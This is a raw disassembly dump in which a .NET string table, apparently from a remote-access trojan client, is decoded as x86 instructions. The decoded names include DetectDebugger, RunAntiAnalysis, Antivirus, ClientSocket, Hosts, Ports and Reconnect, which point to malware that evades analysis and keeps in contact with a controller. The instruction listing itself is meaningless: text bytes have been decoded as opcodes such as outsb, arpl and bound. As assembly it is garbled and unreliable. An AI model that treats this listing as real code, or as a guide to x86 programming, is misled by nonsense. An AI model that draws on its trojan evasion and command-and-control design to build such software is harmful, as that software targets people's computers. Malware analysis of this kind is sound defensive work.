  406963:	75 66                	jne    0x4069cb
  406965:	66 65 72 00          	data16 gs jb 0x406969
  406969:	53                   	push   %ebx
  40696a:	65 74 41             	gs je  0x4069ae
  40696d:	73 49                	jae    0x4069b8
  40696f:	6e                   	outsb  %ds:(%esi),(%dx)
  406970:	74 65                	je     0x4069d7
  406972:	67 65 72 00          	addr16 gs jb 0x406976
  406976:	44                   	inc    %esp
  406977:	65 74 65             	gs je  0x4069df
  40697a:	63 74 44 65          	arpl   %esi,0x65(%esp,%eax,2)
  40697e:	62 75 67             	bound  %esi,0x67(%ebp)
  406981:	67 65 72 00          	addr16 gs jb 0x406985
  406985:	4d                   	dec    %ebp
  406986:	61                   	popa
  406987:	6e                   	outsb  %ds:(%esi),(%dx)
  406988:	61                   	popa
  406989:	67 65 6d             	gs insl (%dx),%es:(%di)
  40698c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40698e:	74 4f                	je     0x4069df
  406990:	62 6a 65             	bound  %ebp,0x65(%edx)
  406993:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  406997:	61                   	popa
  406998:	72 63                	jb     0x4069fd
  40699a:	68 65 72 00 53       	push   $0x53007265
  40699f:	65 73 73             	gs jae 0x406a15
  4069a2:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4069a9:	6e                   	outsb  %ds:(%esi),(%dx)
  4069aa:	67 45                	addr16 inc %ebp
  4069ac:	76 65                	jbe    0x406a13
  4069ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4069af:	74 48                	je     0x4069f9
  4069b1:	61                   	popa
  4069b2:	6e                   	outsb  %ds:(%esi),(%dx)
  4069b3:	64 6c                	fs insb (%dx),%es:(%edi)
  4069b5:	65 72 00             	gs jb  0x4069b8
  4069b8:	54                   	push   %esp
  4069b9:	69 6d 65 72 00 43 6c 	imul   $0x6c430072,0x65(%ebp),%ebp
  4069c0:	69 65 6e 74 2e 48 65 	imul   $0x65482e74,0x6e(%ebp),%esp
  4069c7:	6c                   	insb   (%dx),%es:(%edi)
  4069c8:	70 65                	jo     0x406a2f
  4069ca:	72 00                	jb     0x4069cc
  4069cc:	54                   	push   %esp
  4069cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4069ce:	55                   	push   %ebp
  4069cf:	70 70                	jo     0x406a41
  4069d1:	65 72 00             	gs jb  0x4069d4
  4069d4:	44                   	inc    %esp
  4069d5:	65 74 65             	gs je  0x406a3d
  4069d8:	63 74 4d 61          	arpl   %esi,0x61(%ebp,%ecx,2)
  4069dc:	6e                   	outsb  %ds:(%esi),(%dx)
  4069dd:	75 66                	jne    0x406a45
  4069df:	61                   	popa
  4069e0:	63 74 75 72          	arpl   %esi,0x72(%ebp,%esi,2)
  4069e4:	65 72 00             	gs jb  0x4069e7
  4069e7:	43                   	inc    %ebx
  4069e8:	75 72                	jne    0x406a5c
  4069ea:	72 65                	jb     0x406a51
  4069ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4069ed:	74 55                	je     0x406a44
  4069ef:	73 65                	jae    0x406a56
  4069f1:	72 00                	jb     0x4069f3
  4069f3:	53                   	push   %ebx
  4069f4:	74 72                	je     0x406a68
  4069f6:	65 61                	gs popa
  4069f8:	6d                   	insl   (%dx),%es:(%edi)
  4069f9:	57                   	push   %edi
  4069fa:	72 69                	jb     0x406a65
  4069fc:	74 65                	je     0x406a63
  4069fe:	72 00                	jb     0x406a00
  406a00:	54                   	push   %esp
  406a01:	65 78 74             	gs js  0x406a78
  406a04:	57                   	push   %edi
  406a05:	72 69                	jb     0x406a70
  406a07:	74 65                	je     0x406a6e
  406a09:	72 00                	jb     0x406a0b
  406a0b:	45                   	inc    %ebp
  406a0c:	6e                   	outsb  %ds:(%esi),(%dx)
  406a0d:	74 65                	je     0x406a74
  406a0f:	72 00                	jb     0x406a11
  406a11:	42                   	inc    %edx
  406a12:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  406a19:	72 
  406a1a:	74 65                	je     0x406a81
  406a1c:	72 00                	jb     0x406a1e
  406a1e:	54                   	push   %esp
  406a1f:	6f                   	outsl  %ds:(%esi),(%dx)
  406a20:	4c                   	dec    %esp
  406a21:	6f                   	outsl  %ds:(%esi),(%dx)
  406a22:	77 65                	ja     0x406a89
  406a24:	72 00                	jb     0x406a26
  406a26:	45                   	inc    %ebp
  406a27:	72 72                	jb     0x406a9b
  406a29:	6f                   	outsl  %ds:(%esi),(%dx)
  406a2a:	72 00                	jb     0x406a2c
  406a2c:	4d                   	dec    %ebp
  406a2d:	61                   	popa
  406a2e:	6e                   	outsb  %ds:(%esi),(%dx)
  406a2f:	61                   	popa
  406a30:	67 65 6d             	gs insl (%dx),%es:(%di)
  406a33:	65 6e                	outsb  %gs:(%esi),(%dx)
  406a35:	74 4f                	je     0x406a86
  406a37:	62 6a 65             	bound  %ebp,0x65(%edx)
  406a3a:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  406a3e:	75 6d                	jne    0x406aad
  406a40:	65 72 61             	gs jb  0x406aa4
  406a43:	74 6f                	je     0x406ab4
  406a45:	72 00                	jb     0x406a47
  406a47:	47                   	inc    %edi
  406a48:	65 74 45             	gs je  0x406a90
  406a4b:	6e                   	outsb  %ds:(%esi),(%dx)
  406a4c:	75 6d                	jne    0x406abb
  406a4e:	65 72 61             	gs jb  0x406ab2
  406a51:	74 6f                	je     0x406ac2
  406a53:	72 00                	jb     0x406a55
  406a55:	41                   	inc    %ecx
  406a56:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  406a5a:	61                   	popa
  406a5b:	74 6f                	je     0x406acc
  406a5d:	72 00                	jb     0x406a5f
  406a5f:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  406a64:	00 2e                	add    %ch,(%esi)
  406a66:	63 63 74             	arpl   %esp,0x74(%ebx)
  406a69:	6f                   	outsl  %ds:(%esi),(%dx)
  406a6a:	72 00                	jb     0x406a6c
  406a6c:	4d                   	dec    %ebp
  406a6d:	6f                   	outsl  %ds:(%esi),(%dx)
  406a6e:	6e                   	outsb  %ds:(%esi),(%dx)
  406a6f:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  406a76:	65 
  406a77:	61                   	popa
  406a78:	74 65                	je     0x406adf
  406a7a:	44                   	inc    %esp
  406a7b:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  406a7f:	70 74                	jo     0x406af5
  406a81:	6f                   	outsl  %ds:(%esi),(%dx)
  406a82:	72 00                	jb     0x406a84
  406a84:	43                   	inc    %ebx
  406a85:	72 65                	jb     0x406aec
  406a87:	61                   	popa
  406a88:	74 65                	je     0x406aef
  406a8a:	45                   	inc    %ebp
  406a8b:	6e                   	outsb  %ds:(%esi),(%dx)
  406a8c:	63 72 79             	arpl   %esi,0x79(%edx)
  406a8f:	70 74                	jo     0x406b05
  406a91:	6f                   	outsl  %ds:(%esi),(%dx)
  406a92:	72 00                	jb     0x406a94
  406a94:	49                   	dec    %ecx
  406a95:	6e                   	outsb  %ds:(%esi),(%dx)
  406a96:	74 50                	je     0x406ae8
  406a98:	74 72                	je     0x406b0c
  406a9a:	00 53 79             	add    %dl,0x79(%ebx)
  406a9d:	73 74                	jae    0x406b13
  406a9f:	65 6d                	gs insl (%dx),%es:(%edi)
  406aa1:	2e 44                	cs inc %esp
  406aa3:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  406aaa:	69 63 73 00 4e 61 74 	imul   $0x74614e00,0x73(%ebx),%esp
  406ab1:	69 76 65 4d 65 74 68 	imul   $0x6874654d,0x65(%esi),%esi
  406ab8:	6f                   	outsl  %ds:(%esi),(%dx)
  406ab9:	64 73 00             	fs jae 0x406abc
  406abc:	4d                   	dec    %ebp
  406abd:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  406ac4:	74 2e                	je     0x406af4
  406ac6:	56                   	push   %esi
  406ac7:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  406ace:	73 69                	jae    0x406b39
  406ad0:	63 2e                	arpl   %ebp,(%esi)
  406ad2:	44                   	inc    %esp
  406ad3:	65 76 69             	gs jbe 0x406b3f
  406ad6:	63 65 73             	arpl   %esp,0x73(%ebp)
  406ad9:	00 53 79             	add    %dl,0x79(%ebx)
  406adc:	73 74                	jae    0x406b52
  406ade:	65 6d                	gs insl (%dx),%es:(%edi)
  406ae0:	2e 52                	cs push %edx
  406ae2:	75 6e                	jne    0x406b52
  406ae4:	74 69                	je     0x406b4f
  406ae6:	6d                   	insl   (%dx),%es:(%edi)
  406ae7:	65 2e 49             	gs cs dec %ecx
  406aea:	6e                   	outsb  %ds:(%esi),(%dx)
  406aeb:	74 65                	je     0x406b52
  406aed:	72 6f                	jb     0x406b5e
  406aef:	70 53                	jo     0x406b44
  406af1:	65 72 76             	gs jb  0x406b6a
  406af4:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  406afb:	73 74                	jae    0x406b71
  406afd:	65 6d                	gs insl (%dx),%es:(%edi)
  406aff:	2e 52                	cs push %edx
  406b01:	75 6e                	jne    0x406b71
  406b03:	74 69                	je     0x406b6e
  406b05:	6d                   	insl   (%dx),%es:(%edi)
  406b06:	65 2e 43             	gs cs inc %ebx
  406b09:	6f                   	outsl  %ds:(%esi),(%dx)
  406b0a:	6d                   	insl   (%dx),%es:(%edi)
  406b0b:	70 69                	jo     0x406b76
  406b0d:	6c                   	insb   (%dx),%es:(%edi)
  406b0e:	65 72 53             	gs jb  0x406b64
  406b11:	65 72 76             	gs jb  0x406b8a
  406b14:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  406b1b:	62 75 67             	bound  %esi,0x67(%ebp)
  406b1e:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  406b25:	65 
  406b26:	73 00                	jae    0x406b28
  406b28:	45                   	inc    %ebp
  406b29:	78 70                	js     0x406b9b
  406b2b:	61                   	popa
  406b2c:	6e                   	outsb  %ds:(%esi),(%dx)
  406b2d:	64 45                	fs inc %ebp
  406b2f:	6e                   	outsb  %ds:(%esi),(%dx)
  406b30:	76 69                	jbe    0x406b9b
  406b32:	72 6f                	jb     0x406ba3
  406b34:	6e                   	outsb  %ds:(%esi),(%dx)
  406b35:	6d                   	insl   (%dx),%es:(%edi)
  406b36:	65 6e                	outsb  %gs:(%esi),(%dx)
  406b38:	74 56                	je     0x406b90
  406b3a:	61                   	popa
  406b3b:	72 69                	jb     0x406ba6
  406b3d:	61                   	popa
  406b3e:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  406b42:	00 47 65             	add    %al,0x65(%edi)
  406b45:	74 50                	je     0x406b97
  406b47:	72 6f                	jb     0x406bb8
  406b49:	63 65 73             	arpl   %esp,0x73(%ebp)
  406b4c:	73 65                	jae    0x406bb3
  406b4e:	73 00                	jae    0x406b50
  406b50:	47                   	inc    %edi
  406b51:	65 74 48             	gs je  0x406b9c
  406b54:	6f                   	outsl  %ds:(%esi),(%dx)
  406b55:	73 74                	jae    0x406bcb
  406b57:	41                   	inc    %ecx
  406b58:	64 64 72 65          	fs fs jb 0x406bc1
  406b5c:	73 73                	jae    0x406bd1
  406b5e:	65 73 00             	gs jae 0x406b61
  406b61:	53                   	push   %ebx
  406b62:	79 73                	jns    0x406bd7
  406b64:	74 65                	je     0x406bcb
  406b66:	6d                   	insl   (%dx),%es:(%edi)
  406b67:	2e 53                	cs push %ebx
  406b69:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  406b6d:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  406b74:	70 
  406b75:	74 6f                	je     0x406be6
  406b77:	67 72 61             	addr16 jb 0x406bdb
  406b7a:	70 68                	jo     0x406be4
  406b7c:	79 2e                	jns    0x406bac
  406b7e:	58                   	pop    %eax
  406b7f:	35 30 39 43 65       	xor    $0x65433930,%eax
  406b84:	72 74                	jb     0x406bfa
  406b86:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  406b8d:	73 00                	jae    0x406b8f
  406b8f:	45                   	inc    %ebp
  406b90:	6e                   	outsb  %ds:(%esi),(%dx)
  406b91:	63 6f 64             	arpl   %ebp,0x64(%edi)
  406b94:	65 32 42 79          	xor    %gs:0x79(%edx),%al
  406b98:	74 65                	je     0x406bff
  406b9a:	73 00                	jae    0x406b9c
  406b9c:	52                   	push   %edx
  406b9d:	66 63 32             	arpl   %si,(%edx)
  406ba0:	38 39                	cmp    %bh,(%ecx)
  406ba2:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  406ba6:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  406bad:	73 00                	jae    0x406baf
  406baf:	52                   	push   %edx
  406bb0:	65 61                	gs popa
  406bb2:	64 41                	fs inc %ecx
  406bb4:	6c                   	insb   (%dx),%es:(%edi)
  406bb5:	6c                   	insb   (%dx),%es:(%edi)
  406bb6:	42                   	inc    %edx
  406bb7:	79 74                	jns    0x406c2d
  406bb9:	65 73 00             	gs jae 0x406bbc
  406bbc:	44                   	inc    %esp
  406bbd:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  406bc1:	65 46                	gs inc %esi
  406bc3:	72 6f                	jb     0x406c34
  406bc5:	6d                   	insl   (%dx),%es:(%edi)
  406bc6:	42                   	inc    %edx
  406bc7:	79 74                	jns    0x406c3d
  406bc9:	65 73 00             	gs jae 0x406bcc
  406bcc:	47                   	inc    %edi
  406bcd:	65 74 41             	gs je  0x406c11
  406bd0:	73 42                	jae    0x406c14
  406bd2:	79 74                	jns    0x406c48
  406bd4:	65 73 00             	gs jae 0x406bd7
  406bd7:	47                   	inc    %edi
  406bd8:	65 74 42             	gs je  0x406c1d
  406bdb:	79 74                	jns    0x406c51
  406bdd:	65 73 00             	gs jae 0x406be0
  406be0:	43                   	inc    %ebx
  406be1:	53                   	push   %ebx
  406be2:	68 61 72 70 41       	push   $0x41707261
  406be7:	72 67                	jb     0x406c50
  406be9:	75 6d                	jne    0x406c58
  406beb:	65 6e                	outsb  %gs:(%esi),(%dx)
  406bed:	74 49                	je     0x406c38
  406bef:	6e                   	outsb  %ds:(%esi),(%dx)
  406bf0:	66 6f                	outsw  %ds:(%esi),(%dx)
  406bf2:	46                   	inc    %esi
  406bf3:	6c                   	insb   (%dx),%es:(%edi)
  406bf4:	61                   	popa
  406bf5:	67 73 00             	addr16 jae 0x406bf8
  406bf8:	43                   	inc    %ebx
  406bf9:	53                   	push   %ebx
  406bfa:	68 61 72 70 42       	push   $0x42707261
  406bff:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  406c06:	61                   	popa
  406c07:	67 73 00             	addr16 jae 0x406c0a
  406c0a:	65 73 46             	gs jae 0x406c53
  406c0d:	6c                   	insb   (%dx),%es:(%edi)
  406c0e:	61                   	popa
  406c0f:	67 73 00             	addr16 jae 0x406c12
  406c12:	53                   	push   %ebx
  406c13:	74 72                	je     0x406c87
  406c15:	69 6e 67 73 00 49 6e 	imul   $0x6e490073,0x67(%esi),%ebp
  406c1c:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  406c23:	65 
  406c24:	53                   	push   %ebx
  406c25:	65 74 74             	gs je  0x406c9c
  406c28:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  406c2f:	73 73                	jae    0x406ca4
  406c31:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  406c38:	6e                   	outsb  %ds:(%esi),(%dx)
  406c39:	67 45                	addr16 inc %ebp
  406c3b:	76 65                	jbe    0x406ca2
  406c3d:	6e                   	outsb  %ds:(%esi),(%dx)
  406c3e:	74 41                	je     0x406c81
  406c40:	72 67                	jb     0x406ca9
  406c42:	73 00                	jae    0x406c44
  406c44:	41                   	inc    %ecx
  406c45:	6e                   	outsb  %ds:(%esi),(%dx)
  406c46:	74 69                	je     0x406cb1
  406c48:	5f                   	pop    %edi
  406c49:	41                   	inc    %ecx
  406c4a:	6e                   	outsb  %ds:(%esi),(%dx)
  406c4b:	61                   	popa
  406c4c:	6c                   	insb   (%dx),%es:(%edi)
  406c4d:	79 73                	jns    0x406cc2
  406c4f:	69 73 00 52 75 6e 41 	imul   $0x416e7552,0x0(%ebx),%esi
  406c56:	6e                   	outsb  %ds:(%esi),(%dx)
  406c57:	74 69                	je     0x406cc2
  406c59:	41                   	inc    %ecx
  406c5a:	6e                   	outsb  %ds:(%esi),(%dx)
  406c5b:	61                   	popa
  406c5c:	6c                   	insb   (%dx),%es:(%edi)
  406c5d:	79 73                	jns    0x406cd2
  406c5f:	69 73 00 50 61 63 6b 	imul   $0x6b636150,0x0(%ebx),%esi
  406c66:	73 00                	jae    0x406c68
  406c68:	49                   	dec    %ecx
  406c69:	43                   	inc    %ebx
  406c6a:	72 65                	jb     0x406cd1
  406c6c:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  406c6f:	74 69                	je     0x406cda
  406c71:	61                   	popa
  406c72:	6c                   	insb   (%dx),%es:(%edi)
  406c73:	73 00                	jae    0x406c75
  406c75:	73 65                	jae    0x406cdc
  406c77:	74 5f                	je     0x406cd8
  406c79:	43                   	inc    %ebx
  406c7a:	72 65                	jb     0x406ce1
  406c7c:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  406c7f:	74 69                	je     0x406cea
  406c81:	61                   	popa
  406c82:	6c                   	insb   (%dx),%es:(%edi)
  406c83:	73 00                	jae    0x406c85
  406c85:	53                   	push   %ebx
  406c86:	73 6c                	jae    0x406cf4
  406c88:	50                   	push   %eax
  406c89:	72 6f                	jb     0x406cfa
  406c8b:	74 6f                	je     0x406cfc
  406c8d:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  406c90:	73 00                	jae    0x406c92
  406c92:	53                   	push   %ebx
  406c93:	79 73                	jns    0x406d08
  406c95:	74 65                	je     0x406cfc
  406c97:	6d                   	insl   (%dx),%es:(%edi)
  406c98:	2e 57                	cs push %edi
  406c9a:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  406ca1:	46                   	inc    %esi
  406ca2:	6f                   	outsl  %ds:(%esi),(%dx)
  406ca3:	72 6d                	jb     0x406d12
  406ca5:	73 00                	jae    0x406ca7
  406ca7:	44                   	inc    %esp
  406ca8:	6e                   	outsb  %ds:(%esi),(%dx)
  406ca9:	73 00                	jae    0x406cab
  406cab:	43                   	inc    %ebx
  406cac:	6f                   	outsl  %ds:(%esi),(%dx)
  406cad:	6e                   	outsb  %ds:(%esi),(%dx)
  406cae:	74 61                	je     0x406d11
  406cb0:	69 6e 73 00 53 74 72 	imul   $0x72745300,0x73(%esi),%ebp
  406cb7:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  406cbe:	74 4f                	je     0x406d0f
  406cc0:	70 74                	jo     0x406d36
  406cc2:	69 6f 6e 73 00 47 65 	imul   $0x65470073,0x6e(%edi),%ebp
  406cc9:	74 49                	je     0x406d14
  406ccb:	6d                   	insl   (%dx),%es:(%edi)
  406ccc:	61                   	popa
  406ccd:	67 65 44             	addr16 gs inc %esp
  406cd0:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  406cd4:	65 72 73             	gs jb  0x406d4a
  406cd7:	00 52 75             	add    %dl,0x75(%edx)
  406cda:	6e                   	outsb  %ds:(%esi),(%dx)
  406cdb:	74 69                	je     0x406d46
  406cdd:	6d                   	insl   (%dx),%es:(%edi)
  406cde:	65 48                	gs dec %eax
  406ce0:	65 6c                	gs insb (%dx),%es:(%edi)
  406ce2:	70 65                	jo     0x406d49
  406ce4:	72 73                	jb     0x406d59
  406ce6:	00 53 73             	add    %dl,0x73(%ebx)
  406ce9:	6c                   	insb   (%dx),%es:(%edi)
  406cea:	50                   	push   %eax
  406ceb:	6f                   	outsl  %ds:(%esi),(%dx)
  406cec:	6c                   	insb   (%dx),%es:(%edi)
  406ced:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  406cf4:	72 73                	jb     0x406d69
  406cf6:	00 73 73             	add    %dh,0x73(%ebx)
  406cf9:	6c                   	insb   (%dx),%es:(%edi)
  406cfa:	50                   	push   %eax
  406cfb:	6f                   	outsl  %ds:(%esi),(%dx)
  406cfc:	6c                   	insb   (%dx),%es:(%edi)
  406cfd:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  406d04:	72 73                	jb     0x406d79
  406d06:	00 68 50             	add    %ch,0x50(%eax)
  406d09:	72 6f                	jb     0x406d7a
  406d0b:	63 65 73             	arpl   %esp,0x73(%ebp)
  406d0e:	73 00                	jae    0x406d10
  406d10:	47                   	inc    %edi
  406d11:	65 74 43             	gs je  0x406d57
  406d14:	75 72                	jne    0x406d88
  406d16:	72 65                	jb     0x406d7d
  406d18:	6e                   	outsb  %ds:(%esi),(%dx)
  406d19:	74 50                	je     0x406d6b
  406d1b:	72 6f                	jb     0x406d8c
  406d1d:	63 65 73             	arpl   %esp,0x73(%ebp)
  406d20:	73 00                	jae    0x406d22
  406d22:	49                   	dec    %ecx
  406d23:	50                   	push   %eax
  406d24:	41                   	inc    %ecx
  406d25:	64 64 72 65          	fs fs jb 0x406d8e
  406d29:	73 73                	jae    0x406d9e
  406d2b:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  406d2f:	6f                   	outsl  %ds:(%esi),(%dx)
  406d30:	6d                   	insl   (%dx),%es:(%edi)
  406d31:	70 72                	jo     0x406da5
  406d33:	65 73 73             	gs jae 0x406da9
  406d36:	00 53 79             	add    %dl,0x79(%ebx)
  406d39:	73 74                	jae    0x406daf
  406d3b:	65 6d                	gs insl (%dx),%es:(%edi)
  406d3d:	2e 4e                	cs dec %esi
  406d3f:	65 74 2e             	gs je  0x406d70
  406d42:	53                   	push   %ebx
  406d43:	6f                   	outsl  %ds:(%esi),(%dx)
  406d44:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  406d47:	74 73                	je     0x406dbc
  406d49:	00 73 65             	add    %dh,0x65(%ebx)
  406d4c:	74 5f                	je     0x406dad
  406d4e:	41                   	inc    %ecx
  406d4f:	72 67                	jb     0x406db8
  406d51:	75 6d                	jne    0x406dc0
  406d53:	65 6e                	outsb  %gs:(%esi),(%dx)
  406d55:	74 73                	je     0x406dca
  406d57:	00 53 79             	add    %dl,0x79(%ebx)
  406d5a:	73 74                	jae    0x406dd0
  406d5c:	65 6d                	gs insl (%dx),%es:(%edi)
  406d5e:	45                   	inc    %ebp
  406d5f:	76 65                	jbe    0x406dc6
  406d61:	6e                   	outsb  %ds:(%esi),(%dx)
  406d62:	74 73                	je     0x406dd7
  406d64:	00 50 6f             	add    %dl,0x6f(%eax)
  406d67:	72 74                	jb     0x406ddd
  406d69:	73 00                	jae    0x406d6b
  406d6b:	45                   	inc    %ebp
  406d6c:	78 69                	js     0x406dd7
  406d6e:	73 74                	jae    0x406de4
  406d70:	73 00                	jae    0x406d72
  406d72:	48                   	dec    %eax
  406d73:	6f                   	outsl  %ds:(%esi),(%dx)
  406d74:	73 74                	jae    0x406dea
  406d76:	73 00                	jae    0x406d78
  406d78:	41                   	inc    %ecx
  406d79:	6e                   	outsb  %ds:(%esi),(%dx)
  406d7a:	74 69                	je     0x406de5
  406d7c:	76 69                	jbe    0x406de7
  406d7e:	72 75                	jb     0x406df5
  406d80:	73 00                	jae    0x406d82
  406d82:	43                   	inc    %ebx
  406d83:	6f                   	outsl  %ds:(%esi),(%dx)
  406d84:	6e                   	outsb  %ds:(%esi),(%dx)
  406d85:	63 61 74             	arpl   %esp,0x74(%ecx)
  406d88:	00 49 6d             	add    %cl,0x6d(%ecx)
  406d8b:	61                   	popa
  406d8c:	67 65 46             	addr16 gs inc %esi
  406d8f:	6f                   	outsl  %ds:(%esi),(%dx)
  406d90:	72 6d                	jb     0x406dff
  406d92:	61                   	popa
  406d93:	74 00                	je     0x406d95
  406d95:	66 6f                	outsw  %ds:(%esi),(%dx)
  406d97:	72 6d                	jb     0x406e06
  406d99:	61                   	popa
  406d9a:	74 00                	je     0x406d9c
  406d9c:	4d                   	dec    %ebp
  406d9d:	61                   	popa
  406d9e:	6e                   	outsb  %ds:(%esi),(%dx)
  406d9f:	61                   	popa
  406da0:	67 65 6d             	gs insl (%dx),%es:(%di)
  406da3:	65 6e                	outsb  %gs:(%esi),(%dx)
  406da5:	74 42                	je     0x406de9
  406da7:	61                   	popa
  406da8:	73 65                	jae    0x406e0f
  406daa:	4f                   	dec    %edi
  406dab:	62 6a 65             	bound  %ebp,0x65(%edx)
  406dae:	63 74 00 46          	arpl   %esi,0x46(%eax,%eax,1)
  406db2:	6f                   	outsl  %ds:(%esi),(%dx)
  406db3:	72 63                	jb     0x406e18
  406db5:	65 50                	gs push %eax
  406db7:	61                   	popa
  406db8:	74 68                	je     0x406e22
  406dba:	4f                   	dec    %edi
  406dbb:	62 6a 65             	bound  %ebp,0x65(%edx)
  406dbe:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  406dc2:	6f                   	outsl  %ds:(%esi),(%dx)
  406dc3:	6c                   	insb   (%dx),%es:(%edi)
  406dc4:	6c                   	insb   (%dx),%es:(%edi)
  406dc5:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  406dca:	6f                   	outsl  %ds:(%esi),(%dx)
  406dcb:	6e                   	outsb  %ds:(%esi),(%dx)
  406dcc:	6e                   	outsb  %ds:(%esi),(%dx)
  406dcd:	65 63 74 00 52       	arpl   %esi,%gs:0x52(%eax,%eax,1)
  406dd2:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  406dd6:	6e                   	outsb  %ds:(%esi),(%dx)
  406dd7:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  406ddc:	65 74 00             	gs je  0x406ddf
  406ddf:	53                   	push   %ebx
  406de0:	79 73                	jns    0x406e55
  406de2:	74 65                	je     0x406e49
  406de4:	6d                   	insl   (%dx),%es:(%edi)
  406de5:	2e 4e                	cs dec %esi
  406de7:	65 74 00             	gs je  0x406dea
  406dea:	53                   	push   %ebx
  406deb:	65 74 00             	gs je  0x406dee
  406dee:	54                   	push   %esp
  406def:	61                   	popa
  406df0:	72 67                	jb     0x406e59
  406df2:	65 74 00             	gs je  0x406df5
  406df5:	43                   	inc    %ebx
  406df6:	6c                   	insb   (%dx),%es:(%edi)
  406df7:	69 65 6e 74 2e 48 61 	imul   $0x61482e74,0x6e(%ebp),%esp
  406dfe:	6e                   	outsb  %ds:(%esi),(%dx)
  406dff:	64 6c                	fs insb (%dx),%es:(%edi)
  406e01:	65 5f                	gs pop %edi
  406e03:	50                   	push   %eax
  406e04:	61                   	popa
  406e05:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  406e08:	74 00                	je     0x406e0a
  406e0a:	4b                   	dec    %ebx
  406e0b:	65 65 70 41          	gs gs jo 0x406e50
  406e0f:	6c                   	insb   (%dx),%es:(%edi)
  406e10:	69 76 65 50 61 63 6b 	imul   $0x6b636150,0x65(%esi),%esi
  406e17:	65 74 00             	gs je  0x406e1a
  406e1a:	43                   	inc    %ebx
  406e1b:	6c                   	insb   (%dx),%es:(%edi)
  406e1c:	69 65 6e 74 53 6f 63 	imul   $0x636f5374,0x6e(%ebp),%esp
  406e23:	6b 65 74 00          	imul   $0x0,0x74(%ebp),%esp
  406e27:	67 65 74 5f          	addr16 gs je 0x406e8a
  406e2b:	4f                   	dec    %edi
  406e2c:	66 66 73 65          	data16 data16 jae 0x406e95
  406e30:	74 00                	je     0x406e32
  406e32:	73 65                	jae    0x406e99
  406e34:	74 5f                	je     0x406e95
  406e36:	4f                   	dec    %edi
  406e37:	66 66 73 65          	data16 data16 jae 0x406ea0
  406e3b:	74 00                	je     0x406e3d
  406e3d:	53                   	push   %ebx
  406e3e:	70 6c                	jo     0x406eac
  406e40:	69 74 00 43 6c 69 65 	imul   $0x6e65696c,0x43(%eax,%eax,1),%esi
  406e47:	6e 
  406e48:	74 4f                	je     0x406e99
  406e4a:	6e                   	outsb  %ds:(%esi),(%dx)
  406e4b:	45                   	inc    %ebp
  406e4c:	78 69                	js     0x406eb7
  406e4e:	74 00                	je     0x406e50
  406e50:	53                   	push   %ebx
  406e51:	61                   	popa
  406e52:	6c                   	insb   (%dx),%es:(%edi)
  406e53:	74 00                	je     0x406e55
  406e55:	49                   	dec    %ecx
  406e56:	41                   	inc    %ecx
  406e57:	73 79                	jae    0x406ed2
  406e59:	6e                   	outsb  %ds:(%esi),(%dx)
  406e5a:	63 52 65             	arpl   %edx,0x65(%edx)
  406e5d:	73 75                	jae    0x406ed4
  406e5f:	6c                   	insb   (%dx),%es:(%edi)
  406e60:	74 00                	je     0x406e62
  406e62:	54                   	push   %esp
  406e63:	6f                   	outsl  %ds:(%esi),(%dx)
  406e64:	55                   	push   %ebp
  406e65:	70 70                	jo     0x406ed7
  406e67:	65 72 49             	gs jb  0x406eb3
  406e6a:	6e                   	outsb  %ds:(%esi),(%dx)
  406e6b:	76 61                	jbe    0x406ece
  406e6d:	72 69                	jb     0x406ed8
  406e6f:	61                   	popa
  406e70:	6e                   	outsb  %ds:(%esi),(%dx)
  406e71:	74 00                	je     0x406e73
  406e73:	57                   	push   %edi
  406e74:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
